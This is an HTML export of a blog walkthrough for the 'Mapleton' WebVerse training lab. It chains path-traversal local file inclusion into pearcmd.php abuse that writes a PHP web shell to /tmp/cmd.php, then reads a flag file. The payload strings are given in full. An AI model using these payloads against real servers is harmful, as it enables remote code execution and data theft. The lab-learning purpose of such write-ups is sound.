@@ -1,0 +1,72 @@
+<!DOCTYPE html><html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"><title>Mapleton (LFI to RCE) WebVerse</title><style>
+      * {
+        font-family: Georgia, Cambria, "Times New Roman", Times, serif;
+      }
+      html, body {
+        margin: 0;
+        padding: 0;
+      }
+      h1 {
+        font-size: 50px;
+        margin-bottom: 17px;
+        color: #333;
+      }
+      h2 {
+        font-size: 24px;
+        line-height: 1.6;
+        margin: 30px 0 0 0;
+        margin-bottom: 18px;
+        margin-top: 33px;
+        color: #333;
+      }
+      h3 {
+        font-size: 30px;
+        margin: 10px 0 20px 0;
+        color: #333;
+      }
+      header {
+        width: 640px;
+        margin: auto;
+      }
+      section {
+        width: 640px;
+        margin: auto;
+      }
+      section p {
+        margin-bottom: 27px;
+        font-size: 20px;
+        line-height: 1.6;
+        color: #333;
+      }
+      section img {
+        max-width: 640px;
+      }
+      footer {
+        padding: 0 20px;
+        margin: 50px 0;
+        text-align: center;
+        font-size: 12px;
+      }
+      .aspectRatioPlaceholder {
+        max-width: auto !important;
+        max-height: auto !important;
+      }
+      .aspectRatioPlaceholder-fill {
+        padding-bottom: 0 !important;
+      }
+      header,
+      section[data-field=subtitle],
+      section[data-field=description] {
+        display: none;
+      }
+      </style></head><body><article class="h-entry">
+<header>
+<h1 class="p-name">Mapleton (LFI to RCE) WebVerse</h1>
+</header>
+<section data-field="subtitle" class="p-summary">
+Lab can be found at: https://webverselabs-pro.com/
+</section>
+<section data-field="body" class="e-content">
+<section name="6db6" class="section section--body section--first section--last"><div class="section-divider"><hr class="section-divider"></div><div class="section-content"><div class="section-inner sectionLayout--insetColumn"><h3 name="1a70" id="1a70" class="graf graf--h3 graf--leading graf--title">Mapleton (LFI to RCE) WebVerse</h3><p name="8eea" id="8eea" class="graf graf--p graf-after--h3">Lab can be found at: <a href="https://webverselabs-pro.com/" data-href="https://webverselabs-pro.com/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">https://webverselabs-pro.com/</a></p><figure name="9773" id="9773" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*YUif3tYY2rcZiwgDrEWpNA.png" data-width="826" data-height="454" src="https://cdn-images-1.medium.com/max/800/1*YUif3tYY2rcZiwgDrEWpNA.png"></figure><p name="7a35" id="7a35" class="graf graf--p graf-after--figure">There’s a much more straightforward way of doing this lab. But, I overthought it and ignored the “easy” rating. I recommend <a href="https://kelvin-0110.github.io/posts/mapleton-lfi-sensitive-file-disclosure/" data-href="https://kelvin-0110.github.io/posts/mapleton-lfi-sensitive-file-disclosure/" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">this</a> writeup from Kelvin Security Labs if you want to take a more logical route.</p><p name="4b30" id="4b30" class="graf graf--p graf-after--p">Here’s how I solved it.</p><p name="bd65" id="bd65" class="graf graf--p graf-after--p">I registered and went to a house listing which showed a large image of the house. For some reason, I was drawn to it. Looking at the URL, the listing looked like it had potential for LFI.</p><figure name="0cac" id="0cac" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*tbflKUEMeaMom6Uw90qyiw.png" data-width="1950" data-height="1070" src="https://cdn-images-1.medium.com/max/800/1*tbflKUEMeaMom6Uw90qyiw.png"></figure><p name="f39b" id="f39b" class="graf graf--p graf-after--figure">I began traversing the URL and getting error messages in the page responses, showing where listing.php was located:</p><figure name="86f6" id="86f6" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*SzNQte-RsmEVoKUfa4btBg.png" data-width="1992" data-height="1278" src="https://cdn-images-1.medium.com/max/800/1*SzNQte-RsmEVoKUfa4btBg.png"></figure><p name="3b3a" id="3b3a" class="graf graf--p graf-after--figure">I hopped over into burpsuite and began playing around, seeing what else I could get returned back in the response:</p><figure name="037b" id="037b" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*LJpFl9oc-TUrNPbojOaAeg.png" data-width="1870" data-height="1090" src="https://cdn-images-1.medium.com/max/800/1*LJpFl9oc-TUrNPbojOaAeg.png"></figure><p name="2b1c" id="2b1c" class="graf graf--p graf-after--figure">I spent a long time googling and asking my AI, “I’ve got an LFI but don’t know where the flag is. Give me some ideas I can look into”. AI told me to look and see if pearcmd exists. Ok, let’s do that:</p><figure name="f636" id="f636" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*AVpOSpv2GK1xfQdQDWFLYg.png" data-width="1892" data-height="1056" src="https://cdn-images-1.medium.com/max/800/1*AVpOSpv2GK1xfQdQDWFLYg.png"></figure><p name="7efa" id="7efa" class="graf graf--p graf-after--figure">I got a 200 OK. No errors. So…I guess it exists? I tried to force an error to see if my 200 OK was because the file did exist:</p><figure name="040e" id="040e" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*CCtNDEqIqo6ogmftbNixNg.png" data-width="1882" data-height="1020" src="https://cdn-images-1.medium.com/max/800/1*CCtNDEqIqo6ogmftbNixNg.png"></figure><p name="2873" id="2873" class="graf graf--p graf-after--figure">Ok, now I had to use abuse pearcmd. Full disclosure: I hadn’t heard of it before now. But there was no time like the present to learn about it!</p><p name="674d" id="674d" class="graf graf--p graf-after--p">So what <em class="markup--em markup--p-em">is</em> pearcmd? Well, it is a PHP script that can execute arbitrary commands under certain conditions. It has been known to be abused in Local File Inclusion (LFI) and Remote Code Execution (RCE) scenarios by tricking a vulnerable app into including <code class="markup--code markup--p-code">pearcmd.php</code> and then injecting malicious parameters.</p><p name="6b6c" id="6b6c" class="graf graf--p graf-after--p">I used the following command which basically calls on pearcmd’s “config-create” to write a basic php shell to /tmp/cmd.php</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="eb75" id="eb75" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content"> /listing.php?listing=../../../../usr/local/lib/php/pearcmd.php&amp;+config-create+/&lt;?=system(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>])?&gt;+/tmp/cmd.php </span></pre><figure name="4671" id="4671" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*_hoknY_sVWoaMAARROoDsA.png" data-width="1856" data-height="1034" src="https://cdn-images-1.medium.com/max/800/1*_hoknY_sVWoaMAARROoDsA.png"></figure><p name="28e6" id="28e6" class="graf graf--p graf-after--figure">I knew now I had a success, I wasn&#39;t far from solving the lab. I began testing the shell to see if it was able to pull back data. Spoiler: it was:</p><figure name="e4e4" id="e4e4" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*QqJCJG-StEMzog0AI_hixg.png" data-width="1880" data-height="1068" src="https://cdn-images-1.medium.com/max/800/1*QqJCJG-StEMzog0AI_hixg.png"></figure><p name="271c" id="271c" class="graf graf--p graf-after--figure">From here, I did an ls on the home directory and discovered the “realtor” user:</p><figure name="f112" id="f112" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*s0-Huq6eE86hjZ4m4zYr1Q.png" data-width="1842" data-height="850" src="https://cdn-images-1.medium.com/max/800/1*s0-Huq6eE86hjZ4m4zYr1Q.png"></figure><p name="100a" id="100a" class="graf graf--p graf-after--figure">The realtor user had a flag.txt file in their directory:</p><figure name="8416" id="8416" class="graf graf--figure graf-after--p"><img class="graf-image" data-image-id="1*LeuUV-ABOxCGtPJbpsEViA.png" data-width="1896" data-height="890" src="https://cdn-images-1.medium.com/max/800/1*LeuUV-ABOxCGtPJbpsEViA.png"></figure><p name="aa15" id="aa15" class="graf graf--p graf-after--figure">Running the command below got me the flag:</p><pre data-code-block-mode="1" spellcheck="false" data-code-block-lang="bash" name="5d7f" id="5d7f" class="graf graf--pre graf-after--p graf--preV2"><span class="pre--content">listing=../../../../tmp/cmd.php&amp;c=<span class="hljs-built_in">cat</span>+/home/realtor/flag.txt</span></pre><figure name="524b" id="524b" class="graf graf--figure graf-after--pre"><img class="graf-image" data-image-id="1*H8IjhUzaDtj0g9gRsnjtRA.png" data-width="1642" data-height="898" src="https://cdn-images-1.medium.com/max/800/1*H8IjhUzaDtj0g9gRsnjtRA.png"></figure><p name="b127" id="b127" class="graf graf--p graf-after--figure">Thanks for following along!</p><p name="a7f9" id="a7f9" class="graf graf--p graf-after--p graf--trailing">🍺 Quick message to readers: if my writeups help you, please consider a small donation to my buymeacoffee link <a href="http://buymeacoffee.com/7s26simon" data-href="http://buymeacoffee.com/7s26simon" class="markup--anchor markup--p-anchor" rel="noopener" target="_blank">here</a>. This is not required but is very much appreciated! 🍺</p></div></div></section>
+</section>
+<footer><p>By <a href="https://medium.com/@7s26simon" class="p-author h-card">7s26Simon</a> on <a href="https://medium.com/p/f9d297d5a37e"><time class="dt-published" datetime="2026-05-13T16:01:01.279Z">May 13, 2026</time></a>.</p><p><a href="https://medium.com/@7s26simon/mapleton-lfi-to-rce-webverse-f9d297d5a37e" class="p-canonical">Canonical link</a></p><p>Exported from <a href="https://medium.com">Medium</a> on June 13, 2026.</p></footer></article></body></html>
